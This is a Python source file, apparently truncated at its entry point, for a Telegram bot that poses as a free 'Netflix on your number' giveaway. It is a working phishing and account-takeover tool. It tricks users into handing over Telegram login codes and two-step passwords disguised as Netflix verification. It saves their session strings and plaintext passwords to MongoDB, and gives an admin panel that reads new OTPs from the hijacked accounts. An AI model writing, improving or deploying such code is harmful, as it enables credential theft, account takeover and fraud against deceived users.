"""
FIXED NETFLIX OTP BOT v4.0
With clear phone number display in accounts list
"""

import os
import sys
import logging
import threading
import time
import html
from datetime import datetime
from typing import Dict, Optional, List, Any
from pymongo import MongoClient
from pymongo.errors import ConnectionFailure
import telebot
from telebot.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    Message, CallbackQuery
)

# Import fixed modules
from account import ProfessionalAccountManager, create_account_manager
from otp import (
    safe_error_message, validate_phone, validate_otp,
    format_phone_display, escape_html, create_plain_text_message,
    get_paginated_accounts, format_accounts_list, create_accounts_keyboard,
    create_account_detail_keyboard, format_account_details, 
    format_otp_result, format_no_otp_found
)

# ========================
# CONFIGURATION
# ========================
BOT_TOKEN = os.getenv('BOT_TOKEN', '')
ADMIN_ID_STR = os.getenv('ADMIN_ID', '0')
ADMIN_ID = int(ADMIN_ID_STR) if ADMIN_ID_STR.isdigit() else 0
API_ID_STR = os.getenv('API_ID', '0')
API_ID = int(API_ID_STR) if API_ID_STR.isdigit() else 0
API_HASH = os.getenv('API_HASH', '')
MONGO_URL = os.getenv('MONGO_URL', '')
ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY', None)

MONGO_DB_NAME = "netflix_otp_bot"
NETFLIX_WELCOME_IMAGE = "https://files.catbox.moe/7d6hwv.jpg"
NETFLIX_MAIN_IMAGE = "https://files.catbox.moe/7d6hwv.jpg"
SUPPORT_USERNAME = "@YourSupportBot"

# ========================
# LOGGING
# ========================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# ========================
# SIMPLE DATABASE MANAGER (FIXED)
# ========================
class SimpleDatabaseManager:
    """Simple database manager without complex features"""
    
    def __init__(self, mongo_url: str, db_name: str):
        try:
            self.client = MongoClient(mongo_url, serverSelectionTimeoutMS=5000)
            self.db = self.client[db_name]
            
            # Test connection
            self.client.admin.command('ping')
            logger.info("✅ MongoDB connected successfully")
            
        except ConnectionFailure as e:
            logger.error(f"❌ MongoDB connection failed: {e}")
            # Create a dummy database object to prevent crashes
            self.db = None
    
    def is_connected(self) -> bool:
        """Check if database is connected"""
        try:
            if self.client:
                self.client.admin.command('ping')
                return True
        except:
            pass
        return False
    
    def ensure_user(self, user_id: int, user_name: str, username: str):
        """Ensure user exists in database"""
        if not self.is_connected():
            return
        
        try:
            user = self.db.users.find_one({"user_id": user_id})
            
            if not user:
                user_data = {
                    "user_id": user_id,
                    "name": user_name,
                    "username": username,
                    "is_admin": user_id == ADMIN_ID,
                    "created_at": datetime.utcnow(),
                    "last_seen": datetime.utcnow()
                }
                self.db.users.insert_one(user_data)
                logger.info(f"New user: {user_id} ({user_name})")
            else:
                self.db.users.update_one(
                    {"user_id": user_id},
                    {"$set": {"last_seen": datetime.utcnow()}}
                )
        except Exception as e:
            logger.error(f"Ensure user error: {e}")
    
    def save_account(self, phone: str, session_string: str, 
                    has_2fa: bool = False, two_step_password: str = None,
                    added_by: int = None) -> bool:
        """Save account to database"""
        if not self.is_connected():
            return False
        
        try:
            account_data = {
                "phone": phone,
                "session_string": session_string,
                "has_2fa": has_2fa,
                "two_step_password": two_step_password,
                "added_by": added_by,
                "created_at": datetime.utcnow(),
                "updated_at": datetime.utcnow(),
                "status": "active"
            }
            
            self.db.accounts.update_one(
                {"phone": phone},
                {"$set": account_data},
                upsert=True
            )
            
            logger.info(f"Account saved: {phone}")
            return True
            
        except Exception as e:
            logger.error(f"Save account error: {e}")
            return False
    
    def get_account(self, account_id: str) -> Optional[Dict]:
        """Get account by ID"""
        if not self.is_connected():
            return None
        
        try:
            from bson import ObjectId
            return self.db.accounts.find_one({"_id": ObjectId(account_id)})
        except Exception as e:
            logger.error(f"Get account error: {e}")
            return None
    
    def get_accounts_page(self, page: int = 1, per_page: int = 5) -> tuple:
        """Get paginated accounts"""
        if not self.is_connected():
            return [], 0, 0
        
        try:
            return get_paginated_accounts(self.db.accounts, page, per_page)
        except Exception as e:
            logger.error(f"Get accounts page error: {e}")
            return [], 0, 0
    
    def remove_account(self, account_id: str) -> bool:
        """Remove account from database (logout)"""
        if not self.is_connected():
            return False
        
        try:
            from bson import ObjectId
            result = self.db.accounts.delete_one({"_id": ObjectId(account_id)})
            if result.deleted_count > 0:
                logger.info(f"Account removed: {account_id}")
                return True
            return False
        except Exception as e:
            logger.error(f"Remove account error: {e}")
            return False
    
    def log_otp(self, phone: str, otp: str, fetched_by: int):
        """Log OTP fetch"""
        if not self.is_connected():
            return False
        
        try:
            self.db.otp_logs.insert_one({
                "phone": phone,
                "otp": otp,
                "fetched_by": fetched_by,
                "fetched_at": datetime.utcnow()
            })
            return True
        except Exception as e:
            logger.error(f"Log OTP error: {e}")
            return False
    
    def get_total_accounts(self) -> int:
        """Get total number of accounts"""
        if not self.is_connected():
            return 0
        
        try:
            return self.db.accounts.count_documents({})
        except:
            return 0
    
    def get_recent_otps(self, limit: int = 10) -> List[Dict]:
        """Get recent OTP logs"""
        if not self.is_connected():
            return []
        
        try:
            return list(self.db.otp_logs.find(
                {},
                {"phone": 1, "otp": 1, "fetched_at": 1, "fetched_by": 1}
            ).sort("fetched_at", -1).limit(limit))
        except:
            return []

# ========================
# SESSION STATE MANAGER
# ========================
class SessionStateManager:
    """Thread-safe session state management"""
    
    def __init__(self):
        self.user_states: Dict[int, Dict] = {}
        self.state_lock = threading.RLock()
    
    def set_state(self, user_id: int, state_data: Dict):
        """Set user state"""
        with self.state_lock:
            state_data["timestamp"] = time.time()
            self.user_states[user_id] = state_data
    
    def get_state(self, user_id: int) -> Optional[Dict]:
        """Get user state"""
        with self.state_lock:
            state = self.user_states.get(user_id)
            if state and time.time() - state.get("timestamp", 0) < 900:  # 15 min expiry
                return state
            elif state:
                del self.user_states[user_id]
            return None
    
    def clear_state(self, user_id: int):
        """Clear user state"""
        with self.state_lock:
            self.user_states.pop(user_id, None)

# ========================
# NETFLIX OTP BOT (FIXED)
# ========================
class NetflixOTPBot:
    """Main bot with View Accounts, Pagination, Get OTP, Remove Account"""
    
    def __init__(self):
        # Validate config
        self._validate_config()
        
        # Initialize components
        self.bot = telebot.TeleBot(BOT_TOKEN)
        self.db = SimpleDatabaseManager(MONGO_URL, MONGO_DB_NAME)
        self.state_manager = SessionStateManager()
        
        try:
            self.account_manager = create_account_manager(API_ID, API_HASH, ENCRYPTION_KEY)
            logger.info("✅ Account Manager initialized")
        except Exception as e:
            logger.error(f"❌ Account Manager failed: {e}")
            self.account_manager = None
        
        # Register handlers
        self._register_handlers()
        
        logger.info("✅ Netflix OTP Bot initialized")
    
    def _validate_config(self):
        """Validate configuration"""
        required = {
            "BOT_TOKEN": BOT_TOKEN,
            "ADMIN_ID": ADMIN_ID,
            "API_ID": API_ID,
            "API_HASH": API_HASH,
            "MONGO_URL": MONGO_URL
        }
        
        missing = [k for k, v in required.items() if not v]
        if missing:
            error_msg = f"Missing config: {', '.join(missing)}"
            logger.error(error_msg)
            raise ValueError(error_msg)
    
    def _register_handlers(self):
        """Register bot handlers"""
        
        @self.bot.message_handler(commands=['start'])
        def handle_start(message):
            self._handle_start_safe(message)
        
        @self.bot.message_handler(commands=['help'])
        def handle_help(message):
            self._handle_help_safe(message)
        
        @self.bot.message_handler(commands=['stats'])
        def handle_stats(message):
            self._handle_stats_safe(message)
        
        @self.bot.callback_query_handler(func=lambda call: True)
        def handle_callback(call):
            self._handle_callback_safe(call)
        
        @self.bot.message_handler(func=lambda m: True)
        def handle_message(message):
            self._handle_message_safe(message)
    
    # ========================
    # SAFE HANDLERS
    # ========================
    
    def _handle_start_safe(self, message: Message):
        """Safe start handler"""
        try:
            user_id = message.from_user.id
            user_name = message.from_user.first_name
            username = message.from_user.username
            
            # Ensure user in DB
            self.db.ensure_user(user_id, user_name, username)
            
            # Clear any existing state
            self.state_manager.clear_state(user_id)
            
            # Show appropriate interface
            if user_id == ADMIN_ID:
                self._show_admin_dashboard(user_id, message.chat.id)
            else:
                self._show_welcome(user_id, message.chat.id)
                
        except Exception as e:
            logger.error(f"Start handler error: {e}")
            self._send_safe_message(
                message.chat.id,
                "Please try again with /start"
            )
    
    def _handle_help_safe(self, message: Message):
        """Safe help handler"""
        try:
            help_text = """
🤖 Netflix OTP Bot Help

For Users:
• Click "Get Netflix Now" to start
• Enter phone number with country code
• Verify with OTP sent by Telegram
• Account delivered within 48 hours

For Admin:
• Use admin panel for management
• Add accounts for OTP fetching
• View OTP logs and statistics

Support: {support}
""".format(support=SUPPORT_USERNAME)
            
            self._send_safe_message(
                message.chat.id,
                help_text,
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            
        except Exception as e:
            logger.error(f"Help handler error: {e}")
            self._send_safe_message(
                message.chat.id,
                "Please try again with /start"
            )
    
    def _handle_stats_safe(self, message: Message):
        """Safe stats handler (admin only)"""
        try:
            user_id = message.from_user.id
            
            if user_id != ADMIN_ID:
                self._show_welcome(user_id, message.chat.id)
                return
            
            # Get stats
            total_accounts = self.db.get_total_accounts()
            recent_otps = self.db.get_recent_otps(5)
            
            stats_text = f"""
📊 Bot Statistics

Accounts:
• Total Accounts: {total_accounts}

Recent OTPs:
"""
            
            if recent_otps:
                for i, log in enumerate(recent_otps, 1):
                    phone = format_phone_display(log.get("phone", "N/A"))
                    otp = log.get("otp", "N/A")
                    time_str = log.get("fetched_at", datetime.utcnow()).strftime("%H:%M")
                    stats_text += f"{i}. {phone}: {otp} ({time_str})\n"
            else:
                stats_text += "No recent OTPs\n"
            
            self._send_safe_message(
                message.chat.id,
                stats_text,
                photo_url=NETFLIX_MAIN_IMAGE
            )
            
        except Exception as e:
            logger.error(f"Stats handler error: {e}")
            self._send_safe_message(
                message.chat.id,
                "Error loading statistics"
            )
    
    def _handle_callback_safe(self, call: CallbackQuery):
        """Safe callback handler with all new features"""
        try:
            user_id = call.from_user.id
            chat_id = call.message.chat.id
            data = call.data
            
            # Acknowledge callback
            try:
                self.bot.answer_callback_query(call.id)
            except:
                pass
            
            # Route callbacks
            if data == "get_netflix_now":
                self._start_netflix_login(user_id, chat_id)
            
            elif data == "cancel_netflix":
                self.state_manager.clear_state(user_id)
                self._show_welcome(user_id, chat_id)
            
            elif data == "admin_login" and user_id == ADMIN_ID:
                self._start_admin_login(user_id, chat_id)
            
            elif data == "back_to_admin" and user_id == ADMIN_ID:
                self.state_manager.clear_state(user_id)
                self._show_admin_dashboard(user_id, chat_id)
            
            elif data == "view_accounts" and user_id == ADMIN_ID:
                self._show_accounts_page(user_id, chat_id, page=1)
            
            elif data.startswith("page_") and user_id == ADMIN_ID:
                page = int(data.split("_")[1])
                self._show_accounts_page(user_id, chat_id, page)
            
            elif data.startswith("viewacc_") and user_id == ADMIN_ID:
                account_id = data.split("_")[1]
                self._show_account_details(user_id, chat_id, account_id)
            
            elif data.startswith("getotp_") and user_id == ADMIN_ID:
                account_id = data.split("_")[1]
                self._get_account_otp(user_id, chat_id, account_id, call.id)
            
            elif data.startswith("remove_") and user_id == ADMIN_ID:
                account_id = data.split("_")[1]
                self._remove_account(user_id, chat_id, account_id, call.id)
            
            elif data == "otp_logs" and user_id == ADMIN_ID:
                self._show_otp_logs(user_id, chat_id)
            
            else:
                self._send_safe_message(
                    chat_id,
                    "Please use /start"
                )
                
        except Exception as e:
            logger.error(f"Callback handler error: {e}")
            try:
                self.bot.answer_callback_query(
                    call.id, 
                    "Error, please try again",
                    show_alert=True
                )
            except:
                pass
    
    def _handle_message_safe(self, message: Message):
        """Safe message handler"""
        try:
            user_id = message.from_user.id
            
            # Update user in DB
            self.db.ensure_user(
                user_id,
                message.from_user.first_name,
                message.from_user.username
            )
            
            # Check state
            state = self.state_manager.get_state(user_id)
            if not state:
                if user_id == ADMIN_ID:
                    self._show_admin_dashboard(user_id, message.chat.id)
                else:
                    self._show_welcome(user_id, message.chat.id)
                return
            
            # Route based on state
            if state.get("step") == "ask_phone":
                self._process_phone_input(user_id, message.chat.id, message.text)
            elif state.get("step") == "ask_otp":
                self._process_otp_input(user_id, message.chat.id, message.text, state)
            elif state.get("step") == "ask_2fa":
                self._process_2fa_input(user_id, message.chat.id, message.text, state)
            else:
                self.state_manager.clear_state(user_id)
                self._show_welcome(user_id, message.chat.id)
                
        except Exception as e:
            logger.error(f"Message handler error: {e}")
            self._send_safe_message(
                message.chat.id,
                "Please try again with /start"
            )
    
    # ========================
    # NEW FEATURES: ACCOUNT MANAGEMENT
    # ========================
    
    def _show_accounts_page(self, user_id: int, chat_id: int, page: int = 1):
        """Show paginated accounts list with clear phone numbers"""
        if user_id != ADMIN_ID:
            self._show_welcome(user_id, chat_id)
            return
        
        # Get paginated accounts
        accounts, total_pages, total_accounts = self.db.get_accounts_page(page, 5)
        
        if not accounts:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("➕ Add Account", callback_data="admin_login"))
            markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_admin"))
            
            self._send_safe_message(
                chat_id,
                "📱 No Accounts Found\n\nAdd your first account to get started.",
                markup=markup,
                photo_url=NETFLIX_MAIN_IMAGE,
                parse_mode="HTML"
            )
            return
        
        # Format accounts list - CLEAR PHONE NUMBERS
        text = f"<b>📱 All Accounts (Page {page}/{total_pages})</b>\n\n"
        
        start_num = (page - 1) * 5 + 1
        for idx, account in enumerate(accounts, start=start_num):
            phone = account.get("phone", "N/A")
            
            # Clear phone number display
            if phone.startswith('+91') and len(phone) == 13:
                # Indian number: +91 XXX XXX XXXX format
                cleaned = phone[1:]  # Remove +
                phone_display = f"+{cleaned[:2]} {cleaned[2:5]} {cleaned[5:8]} {cleaned[8:]}"
            else:
                # Other numbers
                phone_display = phone
            
            status_icon = "✅" if account.get("status") == "active" else "⚠️"
            has_2fa = "🔐" if account.get("has_2fa") else ""
            
            # Shorten ID for display
            acc_id = str(account.get("_id", ""))[:8]
            
            text += f"{idx}. {status_icon}{has_2fa} <code>{phone_display}</code>\n"
            text += f"   <i>ID: {acc_id}...</i>\n\n"
        
        text += f"<i>Total Accounts: {total_accounts}</i>"
        
        # Create keyboard
        markup = create_accounts_keyboard(accounts, page, total_pages)
        
        self._send_safe_message(
            chat_id,
            text,
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE,
            parse_mode="HTML"
        )
    
    def _show_account_details(self, user_id: int, chat_id: int, account_id: str):
        """Show account details"""
        if user_id != ADMIN_ID:
            return
        
        account = self.db.get_account(account_id)
        if not account:
            self._send_safe_message(
                chat_id,
                "❌ Account not found",
                photo_url=NETFLIX_MAIN_IMAGE
            )
            self._show_accounts_page(user_id, chat_id, 1)
            return
        
        # Format account details
        details_text = format_account_details(account)
        
        # Create keyboard
        markup = create_account_detail_keyboard(account_id)
        
        self._send_safe_message(
            chat_id,
            details_text,
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE,
            parse_mode="HTML"
        )
    
    def _get_account_otp(self, user_id: int, chat_id: int, account_id: str, callback_id: str = None):
        """Get latest OTP for account"""
        if user_id != ADMIN_ID:
            return
        
        if not self.account_manager:
            self._send_safe_message(
                chat_id,
                "❌ Account Manager not available",
                photo_url=NETFLIX_MAIN_IMAGE
            )
            return
        
        account = self.db.get_account(account_id)
        if not account:
            if callback_id:
                try:
                    self.bot.answer_callback_query(
                        callback_id,
                        "Account not found",
                        show_alert=True
                    )
                except:
                    pass
            return
        
        # Show fetching message
        if callback_id:
            try:
                self.bot.answer_callback_query(
                    callback_id,
                    "⏳ Fetching OTP...",
                    show_alert=False
                )
            except:
                pass
        
        try:
            # Fetch OTP
            otp = self.account_manager.get_latest_otp(
                account["session_string"],
                account["phone"]
            )
            
            if not otp:
                markup = InlineKeyboardMarkup()
                markup.add(InlineKeyboardButton("🔄 Try Again", callback_data=f"getotp_{account_id}"))
                markup.add(InlineKeyboardButton("📱 Account Details", callback_data=f"viewacc_{account_id}"))
                
                self._send_safe_message(
                    chat_id,
                    format_no_otp_found(account["phone"]),
                    markup=markup,
                    photo_url=NETFLIX_MAIN_IMAGE,
                    parse_mode="HTML"
                )
                return
            
            # Log OTP
            self.db.log_otp(account["phone"], otp, user_id)
            
            # Format OTP result
            otp_text = format_otp_result(account["phone"], otp, account)
            
            # Create buttons
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 Fetch Again", callback_data=f"getotp_{account_id}"))
            markup.add(InlineKeyboardButton("📱 Account Details", callback_data=f"viewacc_{account_id}"))
            markup.add(InlineKeyboardButton("📋 All Accounts", callback_data="view_accounts"))
            
            self._send_safe_message(
                chat_id,
                otp_text,
                markup=markup,
                photo_url=NETFLIX_MAIN_IMAGE,
                parse_mode="HTML"
            )
            
        except Exception as e:
            logger.error(f"Get OTP error: {e}")
            if callback_id:
                try:
                    self.bot.answer_callback_query(
                        callback_id,
                        f"Error: {str(e)[:50]}",
                        show_alert=True
                    )
                except:
                    pass
    
    def _remove_account(self, user_id: int, chat_id: int, account_id: str, callback_id: str = None):
        """Remove account (logout)"""
        if user_id != ADMIN_ID:
            return
        
        # Confirm removal
        account = self.db.get_account(account_id)
        if not account:
            if callback_id:
                try:
                    self.bot.answer_callback_query(
                        callback_id,
                        "Account not found",
                        show_alert=True
                    )
                except:
                    pass
            return
        
        # Remove from database
        removed = self.db.remove_account(account_id)
        
        if removed:
            # Show success message
            phone_display = format_phone_display(account["phone"])
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("📋 All Accounts", callback_data="view_accounts"))
            markup.add(InlineKeyboardButton("⬅️ Back to Admin", callback_data="back_to_admin"))
            
            self._send_safe_message(
                chat_id,
                f"✅ Account Removed Successfully\n\nPhone: {phone_display}\n\nAccount has been logged out and removed from database.",
                markup=markup,
                photo_url=NETFLIX_MAIN_IMAGE,
                parse_mode="HTML"
            )
        else:
            if callback_id:
                try:
                    self.bot.answer_callback_query(
                        callback_id,
                        "Failed to remove account",
                        show_alert=True
                    )
                except:
                    pass
    
    def _show_otp_logs(self, user_id: int, chat_id: int):
        """Show OTP logs"""
        if user_id != ADMIN_ID:
            return
        
        # Get recent OTP logs
        logs = self.db.get_recent_otps(20)
        
        if not logs:
            logs_text = "<b>📊 OTP Logs</b>\n\nNo OTP logs found yet."
        else:
            logs_text = "<b>📊 Recent OTP Logs</b>\n\n"
            for idx, log in enumerate(logs, 1):
                phone = format_phone_display(log.get("phone", "N/A"))
                otp = log.get("otp", "N/A")
                time_str = log.get("fetched_at", datetime.utcnow()).strftime("%H:%M")
                logs_text += f"{idx}. {phone}: <code>{otp}</code> ({time_str})\n"
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅️ Back", callback_data="back_to_admin"))
        
        self._send_safe_message(
            chat_id,
            logs_text,
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE,
            parse_mode="HTML"
        )
    
    # ========================
    # EXISTING FLOW FUNCTIONS
    # ========================
    
    def _start_netflix_login(self, user_id: int, chat_id: int):
        """Start Netflix login flow"""
        self.state_manager.set_state(user_id, {
            "step": "ask_phone",
            "user_type": "netflix"
        })
        
        text = """
📱 Netflix Account Setup

Enter your phone number with country code:

Format: +CountryCodeNumber
Example: +919876543210

⚠️ Netflix will send verification code to this number
🔒 Your number is secure and encrypted
"""
        
        self._send_safe_message(
            chat_id,
            text,
            photo_url=NETFLIX_WELCOME_IMAGE
        )
    
    def _start_admin_login(self, user_id: int, chat_id: int):
        """Start admin login flow"""
        self.state_manager.set_state(user_id, {
            "step": "ask_phone",
            "user_type": "admin"
        })
        
        text = """
🔐 Add New Account

Enter phone number with country code:

Format: +CountryCodeNumber
Example: +919876543210

This will add the account to database for OTP fetching.
Encryption: ✅ Enabled
"""
        
        self._send_safe_message(
            chat_id,
            text,
            photo_url=NETFLIX_MAIN_IMAGE
        )
    
    def _process_phone_input(self, user_id: int, chat_id: int, phone_input: str):
        """Process phone number input"""
        if not self.account_manager:
            self._send_safe_message(
                chat_id,
                "❌ Service temporarily unavailable",
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            return
        
        # Validate phone
        is_valid, error_or_phone = validate_phone(phone_input)
        if not is_valid:
            self._send_safe_message(
                chat_id,
                f"❌ Invalid Format\n\n{error_or_phone}\n\nPlease enter valid phone number:",
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            return
        
        phone = error_or_phone
        state = self.state_manager.get_state(user_id)
        user_type = state.get("user_type", "netflix")
        
        # Show sending message
        self._send_safe_message(
            chat_id,
            "⏳ Sending OTP...\n\nPlease wait...",
            photo_url=NETFLIX_WELCOME_IMAGE if user_type == "netflix" else NETFLIX_MAIN_IMAGE
        )
        
        try:
            # Send OTP
            result = self.account_manager.send_otp(phone)
            
            if not result.get("success"):
                error_msg = result.get("error", "Failed to send OTP")
                self._send_safe_message(
                    chat_id,
                    f"❌ Failed to send OTP\n\n{error_msg}\n\nPlease try again:",
                    photo_url=NETFLIX_WELCOME_IMAGE
                )
                return
            
            # Update state
            self.state_manager.set_state(user_id, {
                "step": "ask_otp",
                "user_type": user_type,
                "phone": phone,
                "session_key": result["session_key"],
                "phone_code_hash": result["phone_code_hash"]
            })
            
            # Show OTP input
            if user_type == "admin":
                text = f"""
✅ OTP Sent Successfully

Phone: {format_phone_display(phone)}

Enter the 5-digit OTP code received on Telegram:
"""
            else:
                text = f"""
📩 Netflix Verification Code Sent

Phone: {format_phone_display(phone)}

Enter the 5-digit verification code:
Check your Telegram messages from "Telegram"
"""
                
            self._send_safe_message(
                chat_id,
                text,
                photo_url=NETFLIX_WELCOME_IMAGE if user_type == "netflix" else NETFLIX_MAIN_IMAGE
            )
            
        except Exception as e:
            logger.error(f"Send OTP error: {e}")
            self._send_safe_message(
                chat_id,
                "❌ Connection Error\n\nFailed to send verification code. Please try again with /start",
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            self.state_manager.clear_state(user_id)
    
    def _process_otp_input(self, user_id: int, chat_id: int, otp_input: str, state: Dict):
        """Process OTP input"""
        if not self.account_manager:
            self._send_safe_message(
                chat_id,
                "❌ Service temporarily unavailable",
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            return
        
        if not validate_otp(otp_input):
            self._send_safe_message(
                chat_id,
                "❌ Invalid Code\n\nOTP must be 5 or 6 digits. Please enter again:",
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            return
        
        user_type = state.get("user_type", "netflix")
        
        # Show verifying message
        self._send_safe_message(
            chat_id,
            "⏳ Verifying OTP...\n\nPlease wait...",
            photo_url=NETFLIX_WELCOME_IMAGE if user_type == "netflix" else NETFLIX_MAIN_IMAGE
        )
        
        try:
            # Verify OTP
            result = self.account_manager.verify_otp(
                state["session_key"],
                otp_input
            )
            
            if result.get("needs_2fa"):
                # 2FA required
                self.state_manager.set_state(user_id, {
                    **state,
                    "step": "ask_2fa"
                })
                
                if user_type == "admin":
                    text = """
🔐 Two-Step Verification Required

This account has two-step verification enabled.

Enter your 2-step verification password:
"""
                else:
                    text = """
🔒 Netflix Two-Step Verification

This Netflix account has extra security enabled.

Enter your Netflix account password:
"""
                
                self._send_safe_message(
                    chat_id,
                    text,
                    photo_url=NETFLIX_WELCOME_IMAGE if user_type == "netflix" else NETFLIX_MAIN_IMAGE
                )
                return
            
            if not result.get("success"):
                error_msg = result.get("error", "Verification failed")
                self._send_safe_message(
                    chat_id,
                    f"❌ Verification Failed\n\n{error_msg}\n\nPlease try again with /start",
                    photo_url=NETFLIX_WELCOME_IMAGE
                )
                self.state_manager.clear_state(user_id)
                return
            
            # Save account
            added_by = user_id if user_type == "admin" else None
            saved = self.db.save_account(
                state["phone"],
                result["session_string"],
                result["has_2fa"],
                None,  # No 2FA password in this flow
                added_by
            )
            
            # Show success
            if user_type == "admin":
                success_text = f"""
✅ Account Added Successfully!

Phone: {format_phone_display(state['phone'])}
2FA: {'✅ Enabled' if result['has_2fa'] else '❌ Disabled'}

Account has been added to database.
"""
                self.state_manager.clear_state(user_id)
                self._show_admin_dashboard(user_id, chat_id)
            else:
                success_text = f"""
🎉 Netflix Request Submitted!

Your number: {format_phone_display(state['phone'])}
Status: Under Review
Estimated: 48 Hours

You will receive Netflix account details once approved.
"""
                self.state_manager.clear_state(user_id)
                self._send_safe_message(
                    chat_id,
                    success_text,
                    photo_url=NETFLIX_WELCOME_IMAGE
                )
            
        except Exception as e:
            logger.error(f"Verify OTP error: {e}")
            self._send_safe_message(
                chat_id,
                "❌ Verification Error\n\nPlease try again with /start",
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            self.state_manager.clear_state(user_id)
    
    def _process_2fa_input(self, user_id: int, chat_id: int, password: str, state: Dict):
        """Process 2FA password input"""
        if not self.account_manager:
            self._send_safe_message(
                chat_id,
                "❌ Service temporarily unavailable",
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            return
        
        if not password.strip():
            self._send_safe_message(
                chat_id,
                "❌ Password Required\n\nPassword cannot be empty. Please enter again:",
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            return
        
        user_type = state.get("user_type", "netflix")
        
        # Show verifying message
        self._send_safe_message(
            chat_id,
            "⏳ Verifying Password...\n\nPlease wait...",
            photo_url=NETFLIX_WELCOME_IMAGE if user_type == "netflix" else NETFLIX_MAIN_IMAGE
        )
        
        try:
            # Verify 2FA
            result = self.account_manager.verify_2fa(
                state["session_key"],
                password
            )
            
            if not result.get("success"):
                error_msg = result.get("error", "Invalid password")
                self._send_safe_message(
                    chat_id,
                    f"❌ Password Incorrect\n\n{error_msg}\n\nPlease enter again:",
                    photo_url=NETFLIX_WELCOME_IMAGE
                )
                return
            
            # Save account with 2FA password
            added_by = user_id if user_type == "admin" else None
            saved = self.db.save_account(
                state["phone"],
                result["session_string"],
                True,
                password,
                added_by
            )
            
            # Show success
            if user_type == "admin":
                success_text = f"""
✅ Account Added Successfully!

Phone: {format_phone_display(state['phone'])}
2FA: ✅ Enabled (with password)

Account has been added to database.
"""
                self.state_manager.clear_state(user_id)
                self._show_admin_dashboard(user_id, chat_id)
            else:
                success_text = f"""
🎉 Netflix Account Secured!

Your number: {format_phone_display(state['phone'])}
Security: Two-Step Enabled
Status: Under Review
Estimated: 48 Hours

Netflix account will be delivered within 48 hours.
"""
                self.state_manager.clear_state(user_id)
                self._send_safe_message(
                    chat_id,
                    success_text,
                    photo_url=NETFLIX_WELCOME_IMAGE
                )
            
        except Exception as e:
            logger.error(f"2FA verification error: {e}")
            self._send_safe_message(
                chat_id,
                "❌ Verification Error\n\nPlease try again with /start",
                photo_url=NETFLIX_WELCOME_IMAGE
            )
            self.state_manager.clear_state(user_id)
    
    # ========================
    # UI FUNCTIONS
    # ========================
    
    def _show_welcome(self, user_id: int, chat_id: int):
        """Show welcome screen"""
        text = """
🎬 Welcome To Netflix On Your Number Bot 🎬

Get Your Premium Netflix Account Now 👇

✨ Premium Features:
• 4K Ultra HD Streaming 🎥
• Multiple Profiles 👥
• Ad-Free Experience 🚫
• Download for Offline Viewing 📥

📲 How to Get Netflix:
1. Click "Get Netflix Now" below
2. Enter your phone number
3. Verify with OTP
4. Receive Netflix account in 48 hours

🔥 Limited Time Offer!
⚡ Fast Delivery Guaranteed
"""
        
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🎬 Get Netflix Now", callback_data="get_netflix_now"))
        
        self._send_safe_message(
            chat_id,
            text,
            markup=markup,
            photo_url=NETFLIX_WELCOME_IMAGE
        )
    
    def _show_admin_dashboard(self, user_id: int, chat_id: int):
        """Show admin dashboard with View Accounts button"""
        if user_id != ADMIN_ID:
            self._show_welcome(user_id, chat_id)
            return
        
        # Get quick stats
        total_accounts = self.db.get_total_accounts()
        
        text = f"""
👑 Netflix Admin Panel

📊 Quick Stats:
• Total Accounts: {total_accounts}

🛠️ Management Tools:
• View all accounts (with pagination)
• Get latest OTP from any account
• Remove accounts (logout)
• Add new accounts
• View OTP logs
"""
        
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("📱 View Accounts", callback_data="view_accounts"),
            InlineKeyboardButton("🔐 Add Account", callback_data="admin_login")
        )
        markup.add(
            InlineKeyboardButton("📊 OTP Logs", callback_data="otp_logs"),
            InlineKeyboardButton("📈 Statistics", callback_data="stats")
        )
        
        self._send_safe_message(
            chat_id,
            text,
            markup=markup,
            photo_url=NETFLIX_MAIN_IMAGE
        )
    
    def _send_safe_message(self, chat_id: int, text: str, 
                          markup=None, photo_url: str = None,
                          parse_mode: str = None):
        """Send message with error handling and HTML escaping"""
        try:
            # Escape HTML if not already escaped
            safe_text = escape_html(text) if parse_mode == "HTML" else text
            
            if photo_url:
                self.bot.send_photo(
                    chat_id=chat_id,
                    photo=photo_url,
                    caption=safe_text,
                    reply_markup=markup,
                    parse_mode=parse_mode
                )
            else:
                self.bot.send_message(
                    chat_id=chat_id,
                    text=safe_text,
                    reply_markup=markup,
                    parse_mode=parse_mode
                )
                
        except Exception as e:
            logger.error(f"Send message error: {e}")
            # Fallback: try without formatting
            try:
                plain_text = create_plain_text_message(text)
                self.bot.send_message(chat_id, plain_text)
            except:
                pass  # Final fallback
    
    # ========================
    # BOT CONTROL
    # ========================
    
    def run(self):
        """Run the bot"""
        logger.info("🎬 Starting Netflix OTP Bot...")
        try:
            self.bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except KeyboardInterrupt:
            logger.info("Bot stopped by user")
        except Exception as e:
            logger.error(f"Bot error: {e}")
            raise
        finally:
            self.shutdown()
    
    def shutdown(self):
        """Shutdown gracefully"""
        logger.info("Shutting down bot...")
        if self.account_manager:
            self.account_manager.disconnect_all()


# ========================
# MAIN ENTRY POINT
# ========================
if __name__ == "__main__":
    # Check environment variables
